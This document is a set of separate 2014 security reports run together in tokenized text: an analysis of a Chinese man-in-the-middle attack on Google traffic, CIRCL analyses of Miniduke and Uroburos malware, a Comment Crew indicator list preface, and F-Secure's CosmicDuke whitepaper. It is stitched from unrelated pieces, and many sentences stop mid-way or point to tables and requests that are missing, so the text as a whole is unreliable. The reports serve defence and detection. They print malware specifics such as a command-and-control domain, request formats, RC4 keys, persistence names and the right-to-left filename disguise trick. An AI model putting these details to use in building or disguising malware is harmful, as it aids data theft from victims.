Unfortunately , this means that sometimes malware signed with a compromised certificate will also continue to validate ( despite the revocation ) .
The frequency of these communication attempts can be used to detect the malicious activity .
Unfortunately , attackers take advantage of this by using the port to bypass security appliances to communicate with a C2 server ( such as with the observed X­Shell communications ) .
Sometimes they will recompile the code , sometimes they will merely reconfigure the malware .
This alters the file hash and therefore such a hash is not an effective signature for other configurations of the malware .
Hashes of the individual code sections ( e.g .
Outbound network activity that occurs without a DNS lookup should be treated with suspicion until the purpose of the communications can otherwise be determined .
Legitimate destination IP addresses should be whitelisted to prevent legitimate activity from also being blocked .
Thursday , 04 September 2014 23:55:00 ( UTC / GMT ) The Chinese are running a MITM attack on SSL encrypted traffic between Chinese universities and Google .
We ' ve performed technical analysis of the attack , on request from GreatFire.org , and can confirm that it is a real SSL MITM against www.google.com and that it is being performed from within China .
We were contacted by GreatFire.org yesterday ( September 3 ) with a request to analyze two packet captures from suspected MITM - attacks before they finalized their blog post .
The conclusions from our analysis is now published as part of GreatFire.org 's great blog post titled `` Authorities launch man - in - the- middle attack on Google '' .
In their blog post GreatFire.org write : From August 28 , 2014 reports appeared on Weibo and Google Plus that users in China trying to access google.com and google.com.hk via CERNET , the country 's education network , were receiving warning messages about invalid SSL certificates .
The evidence , which we include later in this post , indicates that this was caused by a man - in - the - middle attack .
While the authorities have been blocking access to most things Google since June 4th , they have kept their hands off of CERNET , China 's nationwide education and research network .
However , in the lead up to the new school year , the Chinese authorities launched a man - in - the - middle ( MITM ) attack against Google .
Our network forensic analysis was performed by investigating the following to packet capture files : The analyzed capture files contain pure IPv6 traffic ( CERNET is a IPv6 network ) which made the analysis a bit different then usual .
We do not disclose the client IP addresses for privacy reasons , but they both seem legit ; one from Peking University ( netname PKU6-CERNET2 ) and the other from Chongqing University ( CQU6-CERNET2 ) .
Both IP addresses belong to AS23910 , named `` China Next Generation Internet CERNET2 '' .
The IP addresses received for www.google.com were in both cases also legit , so the MITM was n't carried out through DNS spoofing .
The Peking University client connected to 2607 : f8b0:4007:804 : : 1013 ( GOOGLE - IPV6 in United States ) and the connection from Chongqing University went to 2404:6800:4005:805 : : 1010 ( GOOGLE_IPV6_AP-20080930 in Australia ) .
The Time - To - Live ( TTL ) values received in the IP packets from www.google.com were in both cases 248 or 249 ( note : TTL is actually called `` Hop Limit '' in IPv6 nomenclature , but we prefer to use the well established term `` TTL '' anyway ) .
The highest possible TTL value is 255 , this means that the received packets have n't made more than 6 or 7 router hops before ending up at the client .
However , the expected number of router hops between a server on GOOGLE - IPV6 and the client at Peking University is around 14 .
The low number of router hops is is a clear indication of an IP MITM taking place .
Here is an IPv6 traceroute from AS25795 in Los Angeles towards the IP address at Peking University ( generated with ARP Networks ' 4or6.com tool ) : As can be seen in the traceroute above , seven hops before the client we find the 2001:252 : : /32 network , which is called `` CNGI International Gateway Network ( CNGIIGN ) '' .
This network is actually part of CERNET , but on AS23911 , which is the network that connects CERNET with its external peers .
A reasonable assumption is therefore that the MITM is carried out on the 2001:252 : : /32 network , or where AS23910 ( 2001 : da8:1 : : 2 ) connects to AS23911 ( 2001:252:0:1 : :1 ) .
This means that the MITM attack is being conducted from within China .
The round - trip time between the client and server can be estimated by measuring the time from when the client sends it initial TCP SYN packet to when it receives a TCP SYN+ACK from the server .
The expected round - trip time for connecting from CERNET to a Google server overseas would be around 150ms or more .
However , in the captures we ' ve analyzed the TCP SYN+ACK package was received in just 8ms ( Peking ) and 52ms ( Chongqing ) respectively .
Again , this is a clear indication of an IP MITM taking place , since Google can not possibly send a response from the US to CERNET within 8ms regardless of how fast they are .
The fast response times also indicate that the machine performing the MITM is located fairly close to the network at Peking University .
Even though the machine performing the MITM was very quick at performing the TCP tree - way handshake we noticed that the application layer communication was terribly slow .
The specification for the TLS handshake ( RFC 2246 ) defines that a ClientHello message should be responded to with a ServerHello .
Google typically send their ServerHello response almost instantly , i.e .
However , in the analyzed captures we noticed ServerHello response times of around 500ms .
We extracted the X.509 certificates from the two capture files to .cer
We noticed that both users received identical certificates , which were both self signed for `` google.com '' .
The fact that the MITM used a self signed certificate makes the attack easily detectable even for the non- technical user , since the web browser will typically display a warning about the site not being trusted .
Additionally the X.509 certificate was created for `` google.com '' rather than `` * .google.com '' .
This is an obvious miss from the MITM'ers side since they were attempting to MITM traffic to `` www.google.com '' but not to `` google.com '' .
Certificate SHA1 fingerprint : f6beadb9bc02e0a152d71c318739cdecfc1c085d Certificate MD5 fingerprint : 66 : D5 : D5:6A : E9:28:51:7C:03:53 : C5 : E1:33:14 : A8:3B A copy of the fake certificate is available on Google drive thanks to GreatFire.org .
All evidence indicates that a MITM attack is being conducted against traffic between China 's nationwide education and research network CERNET and www.google.com .
It looks as if the MITM is carried out on a network belonging to AS23911 , which is the outer part of CERNET that peers with all external networks .
This network is located in China , so we can conclude that the MITM was being done within the country .
It 's difficult to say exactly how the MITM attack was carried out , but we can dismiss DNS spoofing as the used method .
The evidence we ' ve observed instead indicate that the MITM attack is performed either by performing IP hijacking or by simply reconfiguring a router to forward the HTTPS traffic to a transparent SSL proxy .
An alternative to changing the router config would also be to add an in - line device that redirects the desired traffic to the SSL proxy .
However , regardless of how they did it the attacker would be able to decrypt and inspect the traffic going to Google .
We can also conclude that the method used to perform the MITM attack was similar to the Chinese MITM on GitHub , but not identical .
In the scope of targeted attacks with a malware labeled as Miniduke by Kaspersky Labs , CIRCL was interested in the way the malware 's later stages work and what kind of interesting information they reveal ( e.g .
No public analysis was found except the mention in Kaspersky 's report of a custom backdoor , so CIRCL took one of the known samples and started this analysis .
This work has been done with utmost care , following best practices in software reversing , forensic investigations and/or information gathering .
However , the work is only covering small aspects ( based on the indicators given , lacking full context ) and not an exhaustive analysis , and hence the report is as - is , not giving any guarantees of completeness or claiming absolute accuracy .
The document is classiﬁed as TLP : WHITE , therefore CIRCL encourages everyone to share this analysis report as - is without modiﬁcation .
Sample B , contained in Sample A , can be categorized as an exhaustive backdoor , implementing any kind of functionality that can be expected for this kind of attacks .
Despite the fact that it does n't implement any particular fancy or new technique , the code quality appears to be clean and robust , making rich use of C structures and logging and it shows on some places that it is targeting organizational infrastructures rather than home users .
Sample A can be categorized as a container , obfuscating and compressing the real payload .
Sample A has been debugged until Sample B 's decompression ﬁnished .
The memory segment was dumped to disk for further analysis .
The focus of the analysis then shifted to Sample B .
Sample B is identiﬁed to be a HTTP controlled backdoor , enabling the attacker to take full control over the victim computer .
The analysis has been done using a mixed - approach of dynamic analysis and static analysis in order to overcome some of the obfuscation and encryptions used by the malware .
Some of the techniques might have also an impact on the interpretation of the malware .
Unfortunately , when we started this investigation , the domain is now pointing to an IP address of Google and returning a 404 Not Found page only .
An interaction following the protocol of this malware is therefore no longer possible .
The analysis of Sample B revealed the commands as shown in table 1 The attacker controls the remote computer via HTTP GET and POST requests like the following : The request is encoded in a custom BASE64 encoding , using the following alphabet : The malware connects via HTTP GET and POST requests to and the path is ﬁxed : The variable part is the custom BASE64 encoded string corresponding to `` i= '' .
A full request looks like : The user agent is always Sent accept headers are : The malware creates in a value ' AppID ' with the data it calculates from GetTickcount ( ) , used as an identiﬁer / mutex .
No persistency mechanisms have been identiﬁed .
We assume the ﬁle is only dropped and/or executed on request via stage 2 of Miniduke and not running persistently .
Update on Jul 03 2014 : F - Secure released an analysis of the latest MiniDuke evolution , called `` CosmicDuke '' , mentioning similar loaders in old and new samples .
That 's why we updated this document to include a graph of the loader : Decryption of module and function names Command `` exec '' - standard process creation : Command `` exeu '' - process creation in a domain environment The domain news.grouptumbler.com is currently resolving to 173.194.70.101 Before that date , the IP was 200.63.46.33 The IP 200.63.46.33 was hosting the following domains : None , some or all domains in this list might be malicious as well .
During the last weeks , various samples of Uroburos ( also named Urob , Turla , Sengoku , Snark and Pﬁnet ) were analyzed and reports have been published 1234 , also analyses about a suspected predecessor , Agent.btz , are public 5 .
The objective of this analysis is to gather additional Indicators of Compromise or behaviors in order to improve detection and to discover additional insights into the malware .
This document is not considered a ﬁnal release but a work - in- progress document .
Scanned : 2014 - 03 - 16 01:12:54 - 49 scans - 37 detections ( 75.0 % ) No version information included .
We include interesting strings in the corresponding subsection .
Sample A can be considered an installer or dropper .
It drops ﬁles into the system and initializes the environment for production .
First , it probes if a virtual disk is present on the system .
If not , the virtual disk is being created with ﬁle system NTFS , using FormatEx from Microsofts fmifs.dll .
The presence of the malware 's conﬁguration ﬁle is tested : If not found , it is dropped from the resource section 0x88d90 .
The following ﬁles are dropped depending on whether Windows is running in 32 bit or 64 bit .
Independently from the architecture , the ﬁle names of the dropped ﬁles are the same , but a speciﬁc version of the ﬁle is dropped according to the operating system architecture .
This is achieved by a logic similar to the following one .
This is done for all ﬁles except the conﬁguration ﬁle .
The function create_from_resources ( ) looks like : Subsequently , after dropping the correct ﬁles , the malware makes itself persistent on the system and creates a service with the following parameters , which loads the ﬁle usbdev.sys as a kernel driver : If during installation anything goes wrong , the registry keys are deleted .
The ﬁles however are not .
During the installation process , extensive logging is ensuring good visibility on potential installation problems .
The attacker uses english language for the logging , although he is lacking attention to detail when it comes to correct usage of the language , as the following examples demonstrate : Language deﬁcits are also demonstrated in other ﬁles of this collection .
We show them in a separate chapter .
A list of dropped ﬁles is given in the next chapter .
Scanned : 2014 - 03 - 23 21:28:41 - 51 scans - 36 detections ( 70.0 % ) Scanned : 2011 - 07 - 07 04:43:10 - 43 scans - 19 detections ( 44.0 % ) Flags : 00000000 Time stamp : Fri Oct 2 09:07:16 2009 Version : 0.0 DLL name : CARBON.dll Ordinals base : 1 .
Sample B also checks for the presence of infection markers in form of events : or as pseudo - code : That means , the famous Agent.btz marker \BaseNamedObjects\ { B93DFED5 - 9A3B-459b - A617 - 59FD9FAD693E } is checked directly using a UNICODE_STRING structure without using RtlInitUnicodeString ( ) .
A brief comparison with other samples , like or shows , that this marker is checked in the same way .
The analysis of this kernel module by deresz and tecamac is very detailed .
We advise the interested reader to work through their document to understand all the details .
In this module , the following transport or communication modules are present : Type 1 : tcp Type 2 : np , m2b - > TODO : Compare this with the observed transports in userland modules modules described in other reports This sample contains a large chunk of code taken from the Udis86 Disassembler Library for x86 / x86 - 64 project 6 The devices \Device\RawDisk1 \Device\RawDisk2 and the ﬁle \SystemRoot\ $ NtUninstallQ722833 $ \ﬁxdata.dat are already known from other reports .
If the ﬁle ﬁxdata.dat could successfully be created within the function also the devices are created within this function : The authors demonstrate that they have a sense of humor .
In the following example , they decrypt ( XOR ) the strings used to assemble the locations of where to drop the other components of the malware to .
The ﬁnal destinations are : \.\IdeDrive1\cryptoapi.dll \.\IdeDrive1\inetpub.dll But have a closer look at how they decrypt the string : They are seriously using a key 0x4E415341 to decrypt the string .
That 's how they decrypt and assemble the string IdeDrive , appending a ' 1 ' in the next step and using if for creating the destination .
Full excerpt below : \Registry\Machine\usblink_export HKEY_LOCAL_MACHINE\usblink_export ( also LEGACY_usblink and usblink ? ) The malware checks if the queried process has one of the following names and if so , it would call pulse_event_wininet_activate ( ) .
The event \BaseNamedObjects\wininet_activate is then created and pulsed .
There are no references to this event , neither in this module nor in the other analyzed modules .
Microsoft mentions in the documentation of the PulseEvent function 7 : Note This function is unreliable and should not be used .
It exists mainly for backward compatibility .
For more information , see Remarks .
So it could well be that this part is old code and was forgotten to be removed .
From Microsoft Support article AGP program may hang when using page size extension on Athlon processor 8 the following excerpt : The following workaround for this issue prevents Memory Manager from using the processor 's Page Size Extension feature and may aﬀect the performance of some programs , depending on the paging behavior .
This registry value also limits non - paged pool to a maximum of 128 megabytes ( MB ) instead of 256 MB .
Original ﬁlename : carbon_system.dll Internal name : Carbon v3.61 This component ﬁrst initializes the winsock subsystem by calling WSAStartup .
Right after it creates directories on the VFS : CreateDirectoryA ( `` \\\\.\\IdeDrive1\\\\Tasks\\ '' , ( LPSECURITY_ATTRIBUTES ) & Dst ) ; CreateDirectoryA ( `` \\\\.\\IdeDrive1\\\\Results\\ '' , ( LPSECURITY_ATTRIBUTES ) & Dst ) ; Sample D is the next ﬁle in the logical execution order , as it creates the following mutexes , which are also accessed by Sample E. Sample D can be considered the main userland module , a control unit that sets up the communication with the kernel module and has the ability to load plugins dynamically during runtime .
The internal name of this module , carbon_system.dll , supports this observation .
The ﬁrst two are : get_initialization_parameters_create_GUID_and_check_Packet_Capturing ( ) periodic_free_space_check_and_write_log ( ) These serve the purpose of initializing the environment for the malware and running maintenance and log tasks .
Then a function load_transports ( ) is called ( more later ) , and then four more threads are started : read_conﬁg_start_thread_start ( ) thread 5 - handles frag.np/frag.tcp requests thread 6 - handles frag.np/frag.tcp requests execute_plugin ( ) - starts a new thread , calling a DLLs export ModuleStart from the \.\IdeDrive1\\Plugins\ directory In this module , the following transport or communication modules are present : Type 1 : tcp , b2 m Type 2 : np , frag , m2b each associated with a bunch of functions : TODO : these functions need to be analyzed and described Other reports mention diﬀerent other transports that are not present in this collection .
When a successful handle is returned , a ﬁle is being downloaded and stored in the virtual ﬁle system .
What follows is a GET in HTTP/1.0 on default.asp ? act= % u & id= % u & item= % u & event_id= % u & cln= % u & flt= % u & serv= % s & t= % ld & mode = query & lang = en & date= % s This code is part of sub_20009871 , which continues to serve the frag.np/frag.tcp part .
In sub_200075C0 another POST in HTTP/1.0 to default.asp ? act= % u & id= % u & item= % u & event_id= % u & cln= % u & flt= % u & serv= % s & t= % ld & mode = query & lang = en & date= % s follows .
The purpose of the two functions is not clear , yet .
In this module , the following transport or communication modules are present : Type 1 : tcp , b2 m Type 2 : np , frag , m2b This corresponds to the transports found in Sample D. The compiled code of bzip2/libbzip2 , a program and library for lossless block - sorting data compression , was identiﬁed , coming from http : //svn.apache.org / repos / asf / labs / axmake / trunk / src / libuc++/srclib / bzip2/compress.c .
Using the source code without including the author 's Copyright statement , the conditions and the disclaimer is an infringement of the software license : Sample C and D contain author names of three people : vlad gilg urik Newer samples , for instance the one from BAE , contain only two : vlad gilg First check - in : 2006 - 03 - 20 Last check - in : 2008 - 11 - 25 When incorporating the check - in dates of the BAE sample , the following graph shows that someone checked - in a ﬁle once during a Saturday .
A small collection of strings demonstrates the language deﬁcits , mainly distinguishable as : Use of backticks instead of apostrophes by some of the developers Problems using past tense by some developers Spelling Mistranslated terms Oversights Examples : win32 detect ...
Arg file failed .
Update failed = ( ( Ca n't create file .
As this family of malware might be diﬀicult to detect from a network perspective , we recommend to perform check of the indicators at the system level .
Version 0.9 July 10 , 2014 work - in - progress ( not a ﬁnal release ) ( TLP : WHITE ) 1 . http : //info.baesystemsdetica.com / rs / baesystems / images / snake_whitepaper.pdf ↩ 2 . http : //artemonsecurity.com / uroburos.pdf ↩ ↩2 3 . http : //blogs.avg.com / news - threats / turla - rootkit - analysed/ ↩ 4 . http : //www.symantec.com / security_response / writeup.jsp ? docid=2009 - 110919 - 1741 - 99 & tabid=2 ↩ 5 . http : //blog.threatexpert.com/2008/11/agentbtz - threat - that - hit - pentagon.html ↩ 6 . http : //udis86.sourceforge.net ↩ 7 . http : //msdn.microsoft.com / en - us / library / windows / desktop / ms684914 ( v = vs.85 ) .aspx
Content from this website is classiﬁed as TLP : WHITE information may be distributed without restriction , subject to copyright controls .
Copyright 2008 - 2014 CIRCL Computer Incident Response Center Luxembourg ( smile gie ) , national CERT .
This document contains additional Comment Crew indicators of compromise that were seen in the past year .
See our accompanying blog for more information .
This document details the following types of indictors : - Network - File - System - Email The contents of this document are indicators only and may match legitimate services or applications .
Additional verification is required to confirm an actual compromise .
Network based indications of possible compromise by the comment crew attackers .
File based indications of possible compromise by the comment crew attackers .
Email based indications of possible compromise by the comment crew attackers .
When active on an infected machine , CosmicDuke will search for and harvest login details from a range of programs and forward the data to remote servers , some of which were active at the time of writing .
F - SECURE LABS SECURITY RESPONSE Malware Analysis Whitepaper In early 2013 , the MiniDuke malware was discovered in use in a series of attacks against NATO and European government agencies .
While investigating MiniDuke loaders in April 2014 , we were surprised to notice that the malicious executable being decompressed and loaded into memory was very similar to the Cosmu family of information - stealers , which we saw as long ago as 2001 .
Cosmu is the first malware family we have seen to share code with MiniDuke .
This analysis is focused on those Cosmu samples that share code with MiniDuke .
Some of these are older than the oldest publicly documented MiniDuke samples , implying that the shared code might have been originally used by Cosmu , not MiniDuke .
For convenience , we decided to name the samples showing this amalgamation of MiniDuke - derived loader and Cosmu - derived payload CosmicDuke .
The filenames and content used in CosmicDuke 's attack files to lure victims into opening them contain references to the countries of Ukraine , Poland , Turkey and Russia , either generally in use of language or included detail , or in allusions to events or institutions .
The filenames and content chosen seem to be tailored to their target 's interests , though at the time of writing , we have no further information on the identity or location of these victims .
Once the victim opens the file , the malware gains persistence on the system and starts collecting information .
The data collection components include a keylogger , clipboard stealer , screenshotter , and password stealers for a variety of popular chat , email and web browsing programs .
It also collects information about the files on the system , and has the capability to export cryptographic certificates and the associated private keys .
Once the information has been collected , it is sent out to remote servers via FTP .
In addition to stealing information from the system , Cosmu allows the attacker to download and execute other malware on the system .
F - Secure has detections for all the different malicious components used by the Cosmu variants described in this report .
We have seen dozens of Cosmu samples that share code with MiniDuke .
Rather than cover the entire spectrum of samples , the scope of this analysis was intentionally limited to highlighting the most interesting of the recent samples .
This includes examining the attack files used to infect targets , the remote servers storing data collected from the victims and the differences between the MiniDuke loaders and Cosmu info - stealers used in the samples .
This analysis is based on examination of files we gathered through our sample collection systems .
Based on the nature of the filenames and decoy documents used , and the fact that the MiniDuke loader is known to be used as a part of targeted attacks , we suspect that CosmicDuke may also be used in such operations .
At the time of writing , we have not identified any victims ourselves , nor are we aware of any public reports confirming this scenario .
At this time , we have no information on how the CosmicDuke attack files are delivered to the victims , though based on the findings from the analysis , we can make an educated guess .
It is possible that the PDF documents containing exploits were emailed to the targeted users as file attachments .
Assuming that the email gateway used by the victims does not include an antivirus solution capable of identifying the exploit , such files would have little impediment to being spread by email .
It is however unlikely that the samples which camouflaged the executable files as image or document files would be distributed in the same way .
Regardless of any tricks played with the filenames , the files themselves are Windows executables , and many email solutions today prevent users from opening attached executable files .
The attackers are using at least two different methods for infecting the systems : exploits and social engineering .
When the file is launched , the object exploits the known CVE-2011 - 0611 vulnerability in specific versions of Adobe Flash , Reader and Acrobat products .
Unlike the CosmicDuke files geared towards social engineering , the exploit files do not actually display any documents to the user as a form of distraction ; the malware simply straightaway exploits the vulnerability .
Less technically challenging CosmicDuke samples use simple social engineering to trick the user into willingly launching the attack file .
Once launched , the file drops the malware onto the system ( such files are therefore referred to as droppers in the rest of this documents ) .
To do so , the malware 's executable file is first disguised as an image or document to make it seem innocuous .
When launched , a document or image is displayed in order to draw the user 's attention away from any background activity .
In the meantime , the malware 's malicious files are silently installed and executed on the system .
The different ways it collects information from the infected machine are as follows : yy Keylogger yy Taking screenshots yy Stealing data from clipboard yy Stealing files yy Stealing PKI certificates and associated private keys yy Stealing usernames and passwords from browsers , instant messengers and email clients yy Stealing WLAN passwords yy Stealing Windows password hashes The information collected by the malware is automatically uploaded to remote servers via FTP .
Our analysis also reveals various details of the remote sites contacted by CosmicDuke , including the login credentials used and the FTP folder structure .
At the time of writing , most of these remote sites are live .
A list of the servers CosmicDuke malware connects to is on page 15 .
The full details of how the samples were grouped is listed on page 11 ; Figure 2 at left provides a quick summary of the grouping as they relate to how CosmicDuke is delivered , and the decoy documents shown .
The first group of samples ( Group # 1 ) is spread using 3 dropper files that display specific decoy documents .
The second sample group ( Group # 2 ) uses both exploit - loaded files and dropper files .
The third group ( Group # 3 ) is rather an exception , as it does not use the droppers or exploits listed here ; for the sake of simplicity , we will exclude considering Group # 3 's delivery method .
Image 1 is a screenshot of how the filenames look like in Windows 7 .
The real file extension for the top four files is .scr
Note that the attacker has also carefully changed the icon of the executable to reflect the fake filetype for the first four .
The bottom file is a curious exception , as it does not use a PDF icon as would be expected with a .pdf
This seems to be a common fake product name used in the latest Cosmu samples .
Meanwhile , the filename readily visible to the users is translated from Turkish as `` civilian crisis center status report '' .
The use of RLO is a smart move from the attackers .
Why go through the trouble of exploiting anything if you can simply trick the user into double - clicking an executable that looks a lot like a document file ? As the screenshot demonstrates , unchecking `` Hide extensions for known filetypes '' does not help .
The three- letter file extensions seen at the end of the filename is not the real file extension .
Even though the information in the Type column is correct , most of the users probably do not even check it .
The following are the droppers used by Group # 1 .
Here are the filenames of the decoys , as displayed in Windows , and the decoy images or files they show when launched : yy rcs.Заказ.doc - Image 2 yy rcs.18.jpg - Image 3 yy rcs . DSC_1365527283.jpg - Image 4 The decoys are interesting .
Заказ means `` order '' in Russian .
Based on the characters СЖС-1295 and ГХРП found in the decoy , the document looks like an order for growth hormones .
The document contains full delivery address , including the name of the person placing the order .
An interesting detail about the image file of a receipt ( Image 3 ) shown by rcs.18.jpg is that it contains EXIF metadata , including the date when the photo was taken and the model of the mobile phone that was used to take the photo .
Part of this EXIF metadata is shown in Image 3a .
The third dropper file we ' ve seen uses the filename ' rcs .
Ukraine - Gas - Pipelines - Security - Report - March-2014.pdf ' , and displays the decoy document shown in Image 6 .
This particular dropper file is notable in that its info - stealer ( SHA1 : f513b21738ae3083d79e4fa1039889e1c3efff58 ) is the same one used by the exploit file named `` Bulletin - PISM- No-31- ( 625 ) -March-10 - 2014.pdf '' .
The code used by CosmicDuke to exploit the CVE-2011- 0611 vulnerability appears to be derived from this proof- of - concept code that was made available in early 2011 : yy http : //www.exploit - db.com / exploits/17473/ The samples we analyzed of the exploit - based CosmicDuke variety had the file names and SHA1 values listed in Figure 3 at right ( see `` Appendix A | Samples '' for more details ) .
Some of these exploit files have interesting filenames , such as `` dip.mail march.pdf '' and `` Bulletin - PISM - No- 31- ( 625 ) -March-10 - 2014.pdf '' .
The PISM mentioned in the latter presumably refers to the Polish Institute of International Affairs .
The CosmicDuke samples we analyzed used the same loader as MiniDuke 's stage 3 samples , making this the first occasion in which we ' ve seen other malware using this particular loader .
The parallel usage of the loader in the CosmicDuke and MiniDuke families is interesting .
The oldest samples we have of this loader that loads Cosmu malware show the compilation date of the loader as March 24 2011 , which predates the oldest publicly documented MiniDuke sample ( with a recorded loader compilation date of June 18 2012 ) .
The earlier use of the loader with a Cosmu payload leads us to suspect the existence of a link between the author ( s ) of Cosmu and MiniDuke .
The most common compilation date seen for the loaders that load the Cosmu malware is November 13 2012 .
Perhaps coincidentally , we found one MiniDuke sample ( originally reported by CrySys ) that also shows the same compilation date .
In this case however , the MiniDuke component is actually a downloader ; it connects to an IP address in Turkey , and when it receives a response , decrypts and executes it .
Also of interest is that once the MiniDuke loader was updated , we saw CosmicDuke samples take the updated loader into use in mid - April 1 2014 , a few months after MiniDuke started using the latest loader in mid - December 2013 .
It seems possible that the actors behind the two malware families share code and/or tools .
The Cosmu info - stealer is the main component of the CosmicDuke malware .
The technical description of the info - stealer is based on analysis of the following sample : SHA1 : b072577447cdf3936d95e612057e510dd3435963 .
Cosmu has a couple of different mechanisms for achieving persistence on the system .
It creates a scheduled task and installs a Windows service .
The scheduled task is typically named `` Watchmon Service '' .
It executes the malware at system startup .
The service typically has name javamtsup , and the display name is `` Java ( TM ) Virtual Machine Support Service '' .
The size of the service binary on disk varies , but typically the real size is 5120 bytes ( based on PE headers ) and the SHA1 value is 7803f160af428bcfb4b9ea2aba07886f232cde4e .
The service itself is very straightforward : it opens a handle to explorer.exe process , duplicates its process token , reads the path of the actual malware binary from registry ( key HKLM\Software\JavaSoft , value Supplement ) and starts the malware using the duplicated process token .
Cosmu copies itself with a couple of different filenames to % WINDIR % \system32 .
The binaries on the disk have a variable length of zero - padding but they are all essentially copies of the original malware binary .
The filenames for both the Cosmu copies and the service binary are generated by randomly taking two items from the following list and concatenating them , resulting in filenames like usbmon.exe , urllsa.exe , and rasdns.exe : The malware targets the following software : yy Instant messaging  Skype The malware steals Skype login MD5 .
The attacker can obtain victim 's Skype username and password by using a bruteforce or dictionary attack to crack the MD5 .
The attack was publicly documented in 2006 .
It also collects information about visited websites , i.e. , browsing history .
The malware does not decrypt the credentials .
The malware does not decrypt the credentials .
Cosmu exports certificates and , if available , the associated private keys from system store by calling PFXExportCertStoreEx .
The malware uses the password '' saribas '' to encrypt the exported data .
Cosmu searches the hard drives and network drives for files that match any of the below patterns : Patterns * sifr * and * sifer * are interesting because they clearly target non - English filenames , given that ' sifr ' is the Arabic word for zero ( and interestingly enough , also the base word for an encryption cipher in many languages ) .
Cosmu searches removable drives for a broader set of files – only files whose filename matches any of the following patterns are skipped / ignored : An interesting detail is that Cosmu skips searching the removable drive if the volume name is `` trandescend '' ( case insensitive comparison ) .
The keylogger is implemented using the GetKeyboardState API .
Key logging is skipped if one of the following AV process is running on the system : Cosmu takes screenshots periodically and sends them to the attacker , together with other stolen data .
Cosmu copies the content of the clipboard every 30 seconds and sends those to the attacker together with other stolen data .
The configuration can contain the following information : yy HTTP server IPs and URL paths yy FTP server IPs , usernames and passwords yy WebDav IPs , usernames and passwords yy Filename prefix and file extension for downloaded files yy Filename prefix and file extension for exfiltrated data In all the configurations we have seen , the servers are specified using IP addresses , not domain names .
The configuration is embedded into the info - stealer .
It is compressed using an algorithm similar to but simpler than LZNT-1 .
The sample makes HTTP GET requests to the server ( s ) specified in the configuration .
The GET request contains the following fields in this order : The first field , m or mgn , does not have any value .
The value of Auth is the ID of the sample .
It is the same 8-character hex digit that can be found in the PDB path , among other places .
The value of Query depends on the request .
It is either encoded using URL safe base64 , or then the value is a 1792-character string .
That string is composed of a 256-character string that is repeated seven times .
The 256-character string is generated by selecting characters randomly from the following 32-character alphabet : abcdefghijklmnopqrstuvwxyz012345 The malware uses the FTP servers and WebDav servers both for exfiltrating the collected data and for updating the malware .
All servers used by the info - stealers listed in `` Appendix A | Samples '' are listed in `` Appendix B | Servers '' .
Cosmu uses RC4 to decrypt incoming data and encrypt outgoing data .
The RC4 routine is not standard RC4 , but instead of an intentional customization it seems that the implementation is simply buggy .
The mistake is illustrated in Figure 5 that shows a Python re - implementation of the buggy RC4 .
All RC4 keys are 32 bytes .
Here are the known keys : yy pHG5AS4deKLil9ADdR2BcA1hTNm0FQz3 yy 3Pf4GxTaDnx50qWe2Xz62uSptFsR3g3P yy AdjustKernelTableFromSSDTSpace2\x00 yy FB7V61C7509E4L99BDZ7F74A79A69CDF Even though only the first 32 bytes are used as the RC4 key , the first two RC4 keys in the above list are followed by an interesting string : Atruefriendissomeonewhothinksthatyouareagoodegg eventhoughheknowsthatyouareslightlycrackedgroove '' A true friend is someone who thinks that you are a good egg even though he knows that you are slightly cracked '' is a Bernard Meltzer quote .
A comparison of the compilation times of the samples , and of other similarities observed in the file characteristics , reveals some interesting patterns .
For more details , see `` Appendix A | Samples '' .
The oldest Cosmu samples we saw have a compilation timestamp of 2001 - 09 - 25 .
Since it is possible for the compilation timestamp to be manipulated , it may be that the samples are not that old .
We have however not seen any samples that would give us reason to suspect that the timestamp has been tampered with .
These old samples do not use the MiniDuke loader and therefore are not discussed in detail in this analysis .
They do however show some characteristics that link them to these fresh variants .
For example , the credentials and same FTP folder structure used by the old samples have been used on another Cosmu FTP server that is still active .
All droppers were compiled on 2013 - 08 - 02 .
The majority of the loaders were compiled on 2012 - 11- 13 , though one was compiled on 2012 - 12 - 04 - oddly enough , the same day when one MiniDuke payload reported by BitDefender and Kaspersky , ( md5 : 6bc34809e44c40b61dd29e0a387ee682 ) was compiled .
This was a downloader that connects to an IP address in Turkey .
As the server is no longer up however , we were unable to investigate it further .
The compilation timestamps of the info - stealers show more variation .
The oldest variant loaded with the MiniDuke loader was compiled on 2012 - 12 - 04 .
Most of the info - stealers were compiled in February and March 2014 .
The info - stealer samples we have analyzed can be also be separated into three distinct groupings based on the following attributes : yy The program database ( PDB ) path yy Server address and credentials yy The loader yy Filenames and decoy content Full list of the servers contacted by samples in these groupings in available in Appendix B | Servers on page 15 .
All samples in this group have a PDB path on the infected system 's C : \ drive that contains the directory '' botgenstudio '' .
The IP address of the servers used by this group of samples are in Luxembourg , Netherlands , and Russia .
See `` Appendix B | Servers '' for details .
We have seen three different droppers for this sample group .
All droppers use the RLO trick .
We have not found any exploits associated to this group of samples .
All samples in this group have a PDB path that contains directories named `` NITRO '' and `` SVA '' .
The PDB path is always on D : \ drive .
Here are some examples : yy D : \production\nitro\sva\generations\809113dd\bin\ Bot.pdb yy D : \SVA\NITRO\PRODUCTION\Generations\805B1D01\ bin\bot.pdb yy D : \PRODUCTION\NITRO\SVA\Generations\8052B6C0\ bin\Bot.pdb yy D : \PRODUCTION\NITRO\SVA\Generations\80B8A0BA\ bin\bot.pdb All samples except one in this group use PDF files with exploits as an infection vector .
The sole exception is sha1:98f81b03a3b0f7b0b914d783683817953e8d4cf0 .
It does not use an exploit and it does not use a dropper ; instead the loader has a filename ( Sivil Durum Raporu Kriz Merk ? fdp.izay.exe ) that uses the same RLO trick used in Group # 1 samples .
Another interesting detail for this sample is the PDB path : d : \sva\nitro\botgenstudio\interface\ generations\80ddfcc1\bin\Bot.pdb Even though this contains both `` SVA '' and `` NITRO '' , it also contains `` botgenstudio '' , again making it similar to Group # 1 .
One other sample in Group # 2 ( sha1 : fb3b8f6494b211386381a7e4f6524d3e4643c9e9 ) shows a similar PDB path .
The servers used by this group are exclusive to this group , i.e. , the other sample groups do not use any of the servers group # 2 uses .
The most recent CosmicDuke samples all belong to this group .
Unlike Groups # 1 and # 2 , no exploits or droppers are known to be associated with Group # 3 samples , and the loader filenames do not use the RLO trick .
As such , we will not cover Group # 3 's delivery method further .
Of more interest with Group # 3 is that older samples within this groupin show some differences from the latest variants .
A few older samples in Group # 3 still use the original MiniDuke loader , while most recent ones are using the updated MiniDuke loader .
Another difference is that unlike the older ones , the latest samples use the following PDB path : yy D : \PRODUCTION\NITRO\KSK\Generations\70BCDEA1\ bin\Bot.pdb .
This is quite similar to Group # 2 , though it seems `` SVA '' has been replaced by `` KSK '' .
